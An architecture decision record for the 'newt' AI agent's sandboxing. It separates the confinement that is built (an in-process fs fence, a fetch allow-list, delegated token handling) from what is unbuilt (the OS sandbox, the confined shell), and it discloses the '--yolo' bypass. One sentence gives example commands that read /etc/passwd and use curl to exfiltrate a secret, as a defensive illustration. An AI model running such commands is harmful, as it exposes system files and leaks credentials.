# Decision: be honest about what newt's confinement is *today* vs. the target

**Status:** Accepted (decided by Shawn Hartsock, 2026-06-21)
**Date:** 2026-06-21
**Related:** `docs/decisions/agentic_object_capability_security.md` (the OCAP
leash), `docs/decisions/host_command_confinement.md` (how we give the agent CLI
tools — fence the host suite, allow/attest/deny × presence on top),
`docs/security/ocap-deviations.md` (the **authoritative** deviation
register — this doc must agree with it), `docs/design/captured-shell-ocap.md`
and `docs/design/captured-shell-cross-platform.md` (the unbuilt OS-sandbox
matrix), `docs/decisions/structural_parsing_over_regex.md`,
`docs/design/transparent_command_layer.md`,
`docs/design/command_plugin_runtime.md`, and **agent-bridle** (which owns the
confined shell + the `--yolo` bypass; this doctrine is mirrored there).

---

## TL;DR

newt is an object-capability *aspiration* on a commodity OS, and **most of the
sandbox is not built yet**. State it plainly, because the verifier proves it:

- The **OS sandbox** (`b1-os-isolation`: uid-ns + Landlock + seccomp +
  default-deny netns + egress proxy) is **UNBUILT** — `newt_core::ocap::verify_b1()`
  returns `Absent` unconditionally (`sandbox_kind = none`; "the in-process
  monitor is the only barrier"). It is an **OPEN, residual-critical deviation**,
  not a present capability.
- The **brush-backed confined shell** is **stubbed**: on the only crates.io
  configuration, `run_command` fails closed on *every* command ("unavailable in
  this build") until the brush `CommandInterceptor` lands (reubeno/brush#1184 +
  agent-bridle#20).
- So **the only path that actually runs a command today is `--yolo` /
  `--disable-ocap`**, which runs it unconfined on the host shell. The "fail
  closed by default → provide a fail-open hatch" design isn't hypothetical;
  it's the literal current state.

What *is* built and real: an **in-process monitor** (the `Caveats` fs fence on
newt's *native* tools), the **`web_fetch` net leash**, and **delegated
execution** (forge-fetch — tokens read in the harness, never in the model's
context). The faithful pattern is delegation; the OS sandbox is the target. Don't
present the target as present.

## Two senses of "confined"

- **Confined execution (sandboxing):** an executable's side-effects are isolated;
  zero ambient authority; disk/network only via an injected capability (Spritely
  Goblins, Agoric).
- **Confined paths (non-leakage):** a holder cannot reveal state or
  leak/misuse/downcast a capability it holds — references controlled by
  Brands/Enclosures.

Both are properties of *capabilities as language-level references*. We confine
*native processes*, which bounds what is achievable.

## The faithfulness ladder — and where newt actually sits

| Rung | What the holder gets | newt status |
|------|----------------------|-------------|
| **Microkernel / handle-granular** (seL4, Fuchsia) | a handle to *one* resource via IPC | north star; not on a commodity OS |
| **Delegated execution** (`capsudod`-style services) | a request channel to a bounded *action* | **BUILT** for wrapped verbs (forge-fetch); the pattern to extend |
| **Confined execution** (OS sandbox + region grant) | a fenced *region*, ambient inside | **TARGET — UNBUILT** (`b1` Absent; confined shell stubbed) |
| **In-process monitor** (Caveats fence on native tools) | native tool calls checked in-proc; subprocess exec via stub (fail-closed) or `--yolo` (unconfined) | **the real floor today** |
| **Ambient authority** (sudo / raw host exec) | everything | what `--yolo` opts into for the spawned subprocess |

The honest reading: newt's *running* floor is the **in-process monitor**, with
exec either failing closed (stub) or running unconfined (`--yolo`). "Confined
execution" via an OS sandbox is the rung above, and it is **not occupied yet**.

## What is built vs. what is the target

**Built and enforced today:**
- **`lock_fs_to_workspace`** (`newt-core::caveats`): sets the `Caveats` fs
  read/write *scope*. Enforced **in-process** at `tui_permits_path`, and **only
  for newt's native fs tools** (`read_file`/`write_file`/`list`). It is a
  reference monitor in our own process — **not** a kernel fence, and it does
  **not** govern what a spawned subprocess does. Widened by explicit
  `--read`/`--write` grants.
- **`web_fetch` net leash** (agent-bridle `net` axis): host allow-list + SSRF
  screen. Real; not bypassed by `--yolo`.
- **Delegated execution** (forge-fetch): the harness holds the token and runs the
  fetch out-of-band (HTTPS-only, no-redirect); the agent holds a request channel,
  never the credential. Genuinely faithful.

**Target — UNBUILT (open deviations):**
- **`b1-os-isolation`** — Landlock/Seatbelt/AppContainer + seccomp + netns +
  egress proxy. `verify_b1()` is hardwired `Absent`; there is no
  landlock/seccomp/unshare/AppContainer code. Tracked OPEN, residual **critical**,
  in `ocap-deviations.md`. Until it lands, **no OS-level fence exists on any
  platform**, and the present-tense "hard wall" framing is wrong.
- **The brush-backed confined shell** — pending reubeno/brush#1184 +
  agent-bridle#20. Today the wired `shell` tool is a fail-closed stub.

**Not provided at all (and won't be by OS sandboxing):**
- **Confined paths** for native code. A native binary holds raw `fd`s/paths and
  can leak them (across `exec`, into files, to children). No Brands/Enclosures
  over native references. We say so.

## Delegated execution — the faithful pattern, and the leakage mitigation

forge-fetch and the (proposed) confined toolbox are the `capsudod` shape: the
agent never *becomes* network/fs-capable; it **invokes a capability service** for
one bounded action. This helps on both axes — execution (a request channel, not a
binary + region) and leakage (**the agent cannot leak a capability it does not
hold** — the service holds the token/socket). It does **not** "close" the
confined-paths gap (native code we *don't* wrap still leaks); it narrows it by
keeping the capability out of the agent's hands. Prefer delegation; raw exec is
the floor for the unwrapped tail.

## The `--venv` correction (it is *not* a tight capability)

`newt --venv <path>` scans the venv `bin/` and widens the **exec allow-list by
basename** — leading-token string set-membership (`Caveats::permits_exec` /
the `exec_floor` clamp), with **no resolved-target or location check**
(`exec-behavior-bound` is itself an OPEN deviation). The scan **follows symlinks
to grant** (`is_file()`/`metadata()`, then `file_name()`), so a symlink in `bin/`
can add an out-of-fence target *by name*. There is **no Landlock EXECUTE-right
check** denying that today — Landlock is unbuilt. So:

- Granting exec to *everything in a directory* (a venv `bin/`, or the whole
  `PATH`) is **not** a bounded authority over which code runs.
- `--venv`'s only real bound is **whatever fence later applies** — today the
  in-process monitor (and **nothing** under `--yolo`, which runs the plain host
  shell). Not a kernel target-check.

`--venv` is a deliberate human convenience, region-fence-bounded **when a fence
exists**, not a tight capability. The tight surface is the curated,
escape-hatch-free toolbox exposed as delegated services — what the agent
*invokes*, not what it *holds*.

## Honesty is the keystone — and `--yolo` is *provided*, not apologized for

The Charter's keystone is Refusal/honesty; an OCAP story that overclaims is worse
than none, because it invites the confused deputy back under a banner of safety.
So two things are true at once, and we state both:

1. **newt fails closed.** Today this is literal: on stub-shell builds the
   confined `run_command` returns "unavailable in this build" for *every*
   command. Unanticipated (and, right now, *all*) exec is refused, not waved
   through.

2. **We deliberately provide a fail-OPEN choice: `--yolo` / `--disable-ocap`
   (`NEWT_DISABLE_OCAP=1`, value exactly `"1"`).** Failing closed is correct but
   has a cost — it can make the agent *unusable* (today, completely so). Rather
   than force users into an unusable or incomplete fence, we hand them the rein:
   `--yolo` **unbridles** exec for that invocation — `run_command` runs on the
   plain host shell (`sandbox_kind = none`), narrowed only by the in-process
   `exec_floor` leading-token clamp. This is **not insistence — it is an
   allowance**: the bridle is on by default; the human may take it off.

   Be precise about what stays on under `--yolo`: the **`web_fetch` net leash**
   (a real guarantee on that operation's egress) and the **in-process fs fence on
   newt's own native tools** — but **not** over the spawned subprocess. A
   `--yolo`'d `cat /etc/passwd` reads outside the workspace and `curl host -d
   @secret` exfiltrates; the subprocess has no fs/net fence at all. So it is
   "unconfined exec, fenced *native* fs" — never read it as a co-equal fs
   guarantee alongside the `web_fetch` leash.

The OCAP story stays honest **because** of this, not in spite of it: the bridle
is real, the bypass is an explicit, informed act of human agency, and we name the
parts that are still unbuilt. If a claim can't survive `verify_b1()` returning
`Absent` and the deviation register, the claim is wrong — not the register.

## Consequences / rules

1. **Prefer delegated execution** (capability services) over granting exec +
   fencing. New agent-facing power should be a bounded verb, not a binary.
2. **Claims must match `verify_b1()` and `ocap-deviations.md`.** No doc may
   assert an OS sandbox, a kernel "wall", or a target-check that the code marks
   `Absent`/OPEN. Built is "built"; target is "target".
3. **The fence is the boundary — once it exists.** Exec allow-lists (venv, PATH)
   are surface + intent, never the capability; and the in-process monitor governs
   *our* tools, not spawned subprocesses.
4. **Disclose `--yolo` wherever confinement is asserted**, as the provided
   fail-open allowance — not a hidden hole.
5. **Mirror this in agent-bridle**, which owns the (stubbed) confined shell and
   the bypass, so the two repos tell the same honest story.
